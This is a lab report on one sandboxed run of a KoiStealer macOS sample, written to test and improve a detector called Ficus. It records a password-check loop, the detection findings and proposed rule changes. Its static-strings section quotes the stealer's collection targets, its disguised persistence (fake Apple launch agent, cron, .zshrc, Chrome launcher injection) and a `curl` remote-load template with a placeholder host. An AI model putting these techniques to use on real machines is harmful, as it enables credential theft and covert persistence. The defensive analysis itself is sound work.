# KoiStealer in the Ficus malware lab: first pilot run

Run `koistealer-20261119T215601Z-39414`, 2026-11-19. One sample, one run of about two and a quarter minutes.
Written from the run folder's evidence. Statements that come from reading the binary's strings, not from watching it run, are marked **static**.

## Summary

- **What ran.** `KoiStealer.zip` from objective-see/malware, a universal Mach-O named `VisualStudioHelper`, in the lab's throwaway macOS 26.6.2 guest on a fake internet with `eslogger` recording.
- **What happened.** Launched with no arguments, it looped: it started its fake-password-dialog helper (`VisualStudioHelper --dialog`), which aborted with `SIGABRT` every time, then ran `dscl . authonly admin` with an empty answer. 528 times in 135 seconds. It never got a password, so it never reached collection or upload.
- **What Ficus saw.** Four distinct findings about the sample's own processes, two of them high (`odd-location-exec` and `dscl-authonly`), but repeated: 1,677 findings in all and **a triage queue of 1,056 items**, because the loop produces the same finding for every pass. Compared with the Unit 42 article: 0 hits, 4 misses, 4 gaps, 2 for review. The misses are behaviors this run never reached.
- **The sample is not the article's build.** Its hash is none of the article's three Koi hashes, and the article does not call `VisualStudioHelper` a Koi file.
- **What it means for Ficus.** The stealer's one visible act here, a password-validation loop, was caught, and caught loudly: 527 separate high `dscl-authonly` findings and 529 high `odd-location-exec`, one per pass, with nothing grouping them. A person opening the queue would face 1,056 items for one program. Ficus also ignores the 528 failed-authentication events `eslogger` recorded alongside. Everything the article describes (fake prompt, file and keychain collection, upload) is untested until the run gets past the dialog.

## The sample

| | |
|---|---|
| Source | `https://github.com/objective-see/malware`, `KoiStealer.zip`, added 2026-01-08 (commit `39382cf4`) |
| Zip | 2,803,307 bytes, sha256 `83bb2328002335affedb0df26725856bfe02e755550750be73a3f7ba62409eec`, password `infect3d` |
| Contents | `KoiStealer/readme.txt` (98 bytes) and `KoiStealer/VisualStudioHelper` |
| readme | "KOI STEALER", with the write-up `https://unit42.paloaltonetworks.com/macos-malware-targets-crypto-sector/` |
| Binary | 5,636,672 bytes, universal Mach-O (x86_64 and arm64), sha256 `adde2970b40634e91b9ef8520f8e50eaa7901a65f9230e65d7995ac1a47700ef` |
| Signing | ad-hoc, linker-signed, identifier `update_agent-902af8874c22a5b7`, no team ID, Info.plist not bound |
| Links against | CoreFoundation, SystemConfiguration, DiskArbitration, IOKit, Foundation, AppKit, QuartzCore, CoreData, CoreImage, Security |

**The article** is Unit 42, "RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector" (Gabay and Frank, 2025-02-26). It lists three Koi hashes (fat `97abafff…`, x64 `c42b103b…`, arm `8f0e2b8b…`); none is this binary. It names `VisualStudioHelper` only as a RustDoor path. So this is a different build of the family, or a different family, and a miss against the article can mean the variant differs.

## How it was run

- **Guest:** the lean image (recorded as `lab-gold`; since renamed `lab-gold-lean`, see `lab/README.md`), macOS 26.6.2 (25G83), `eslogger` schema 10. Fresh clone, deleted afterwards. Fake bait (browser profiles, keychain items, wallet folders) in place.
- **Network:** a private cable to a gateway VM answering every name and address with INetSim. Isolation check passed before the sample was copied in. The host was never on that network.
- **Recording:** `eslogger` through `tart exec`, 52,728,573 bytes, 23,572 events, 2,000 processes, 0 dropped events, 0 bad lines.
- **Recipe:** `manual`. The sample was unzipped in the guest (macOS `unzip` opened it); I looked at it read-only with `file`, `codesign`, `shasum`, `otool -L` and `strings` inside the guest, then launched it myself.

| Time (UTC, 2026-11-19) | Event |
|---|---|
| 21:56:01 | Run starts |
| 21:56:29 | Start marker (after the unzip) |
| 21:56:41 to 21:56:50 | Read-only inspection in the guest |
| 21:57:12 | `./VisualStudioHelper` launched with no arguments, in the background |
| 21:57:12.429 | First `VisualStudioHelper --dialog` |
| 21:59:27.866 | Last `--dialog`; the run is ended |
| 21:59:27 | End marker |
| 21:59:31 | Run finished, clones deleted |

## What the sample did (observed)

- **A loop of 528 launches in 135 seconds** (about 3.9 a second): `VisualStudioHelper --dialog`, then `dscl . authonly admin` with an empty answer. 527 `dscl` runs and 528 `eslogger` `authentication` events (type `od`); every one of the 528 reports failure.
- **The helper aborts every time.** Crash report `EXC_CRASH`, `SIGABRT`, "abort() called". macOS showed "Problem Report for VisualStudioHelper". The crash reporter was started five times (it rate-limits) and ran `system_profiler` itself. **Why the helper aborts in this guest is not known.**
- **No persistence.** After the run there was no launch agent for the user, no new launch daemon (only the guest agent's and the base image's), no crontab entry for root or the user.
- **No network contact of its own.** The gateway capture has 6,139 packets and 36 distinct DNS names. All but two are Apple services; the two are `safebrowsing.googleapis.com` (not attributed) and my own isolation probe. The HTTP requests are the isolation probes. No name or address is attributable to the sample.
- **No XProtect detection**, no `osascript`, `tccutil`, `crontab` or `chflags` run by the sample. One `tcc_modify` event is in the capture; it is the guest agent being granted screen capture after my own screenshot, not the sample.

Every process I could trace to the sample was either the main binary, a `--dialog` helper or `dscl`.

## What Ficus found

Findings about the sample's process tree (`--under VisualStudioHelper`). Ficus produced the same finding once per process, so the **count** is how many times:

| Rule | Severity | Count | About |
|---|---|---|---|
| `odd-location-exec` | high | 529 | the binary (the main process and each of 528 `--dialog` helpers) running from `~/Downloads`, ad-hoc signed (`update_agent-902af8874c22a5b7`) |
| `dscl-authonly` | high | 527 | `dscl . authonly admin`: checking a password |
| `adhoc` | low | 529 | the binary is ad-hoc signed, no developer identity |
| `orphaned` | low | 1 | its parent shell exited; it now sits under launchd |

The whole capture has 28 distinct findings, **1,677 counting repeats, and a triage queue of 1,056 items**. The 24 distinct findings outside the sample's tree are the guest's own activity: my `ps` commands and the crash reporter's `system_profiler` calls as `recon`, and Apple processes as `uid-mismatch`. The idle baseline has 2 findings and nothing queued, so the extra ones come from this run's crash storm and my commands, not from the image.

## Comparison with the article

Expected behaviors are in `lab/expected/KoiStealer.tsv`, written from the article before the capture was read.

| Result | Behavior (article) | Rule |
|---|---|---|
| Miss | Fake password dialog through `osascript` (title "Visual Studio") | `fake-prompt` |
| Miss | `ps aux`, `system_profiler SPHardwareDataType`, `sw_vers` | `recon` |
| Miss | Copies browser, keychain, Notes, Safari, wallet, Discord, Telegram, SSH, shell-history files | `credential-store-copy` |
| Miss | Feeds AppleScript to `osascript` to copy Desktop and Documents files | `osascript-script` |
| Gap | `tccutil reset AppleEvents` | no rule |
| Gap | Mutes the volume around the upload | no rule |
| Gap | Encrypted HTTP upload from memory (`eslogger` cannot see it) | no rule |
| Gap | Masquerades as a Visual Studio update | no rule |
| Review | `odd-location-exec` (high), `dscl-authonly` (high): not in the article | |

The four misses are behaviors the sample did not get to. The article does not say how Koi checks the password; this build uses `dscl authonly`, which Ficus caught.

## What the binary's strings suggest (static, not run)

None of this was observed running. It is what I read in the strings, and shows what a run that gets past the dialog may do.

- **Command-line options** (a Rust program with `reqwest`): `launch-agent`, `remove-agent`, `daemon`, `unlock`, `inject-launch`, `inject-rc`, `dialog`, `test-dialog`, and a path to a "packed binary".
- **Password prompt:** a configuration with eight target apps (Firefox, Google Chrome, Lark, Microsoft Teams classic, Slack, Visual Studio, Finder, DocuWork) and prompt texts such as "Visual Studio requires permission to compilation projects. Please enter password for <username>". A flag `check_valid_pass: true`: the prompt repeats until the password validates.
- **Collection:** AppleScript that copies Safari's `Cookies.binarycookies` and the Notes database (`NoteStore.sqlite`, `-shm`, `-wal`); a file grab by extension (`.pem`, `.ssh`, `.aws`, `.env`, history files and others) that is **disabled** in the embedded configuration (`copy_files: false`, `files.enabled: false`); a multipart upload of a `temp.zip`.
- **Persistence:** a launch agent identifier `com.apple.update_agent` (and `com.apple.inj_update_agent`), a `* * * * * cp` cron line, `~/.local/.zshrc`, `/tmp/com.apple.lock`, and Chrome started with `--headless --gpu-launcher="/bin/zsh -c …"` (injection). An `rc_remote_load_command` template with `curl -O -s https://site.com/zsh`, where `site.com` is a placeholder.
- **No C2 address** in the strings I extracted. I searched a limited set of patterns, not every string.

## Candidate changes to Ficus

1. **Group repeats in the triage queue.** This run gives 1,056 queue items, among them 527 identical `dscl-authonly` and 529 identical `odd-location-exec` (same rule, same program, same command line). One grouped item with a count and a time span ("527 times in 135 s") would make the loop one thing to triage and say it is a loop. This is the most useful change the run points to.
2. **Use `authentication` events.** `eslogger` recorded 528 failed `od` authentications. Ficus's recommended capture does not include `authentication`, and no rule reads it. A rule for repeated failed authentications from a non-Apple process within a short span is a candidate, and `docs/capturing.md` would gain the event.
3. **`tccutil reset`** and **`osascript` volume muting** (both from the article; untested here).
4. **Persistence the binary's strings point to** (`com.apple.update_agent` launch agent, a cron line, a `.zshrc` write). Ficus has `apple-masquerade` and `persistence-plist`; whether they fire is untested because the run did not get that far.
5. **A respawn storm** (the same child launched hundreds of times) as a signal of its own, which grouping (item 1) would also expose. Speculative; one sample is not enough to design it.

## Limits

- One run of about two and a quarter minutes; the sample never passed its first stage.
- The guest reports `eslogger` schema 10. Ficus's docs say its stdin checks need schema 11, but this guest's `exec` events carry the file descriptors those checks read, and `shell-from-pipe` fired on it in a later run (HeartBreaker). This Koi run simply had no piped shell. (An earlier draft of this report said the checks could not fire; that was wrong.)
- The helper's abort may be a property of this guest (a missing display, a missing permission, or the variant); nothing here shows the sample would behave this way on a real Mac.
- The capture holds my own commands and the system's activity; `--under` separates them by ancestry, but a process the sample starts through launchd or another service (a launch agent, an XPC service) has launchd as its parent, so it would not count as under the sample.
- The expected-behaviors list comes from an article about a different build.

## Next

1. Find out why `--dialog` aborts: run it directly in a fresh clone with its error output captured.
2. If it can be made to work, re-run to reach collection and upload, and compare again.
3. Re-run the baselines after any rule change (`lab/baselines.md`).

## Evidence

Kept outside the repository, in `~/WORK/investigation/MacOSThreats/ficus-lab-data/runs/koistealer/koistealer-20261119T215601Z-39414/` (the sample is live malware; never open the zip on the host).

| File | Size | sha256 |
|---|---|---|
| `capture.jsonl` | 52,728,573 bytes | `cdee96a85905bb0bea09fbe12e4bbe8251ac2f2dce58c3ca907e56a0a807fdb7` |
| `gateway.pcap` | 3,138,748 bytes | `e430b0d74db70185551c3d11bba5699da4481abd4e3b2f1c0f8fd9182e53c4af` |
| `meta.json` | 1,104 bytes | `48affb10962afd1b696dcc2bd3133f9710cc84aba490a77678cc9ce624741ecc` |

Also in that folder: `post-state/` (BTM items, launch folders, crontabs, process list), `findings.tsv`, `findings-sample.tsv`, `gap.md`, `summary.txt`, `isolation.log`, `launcher.log`.
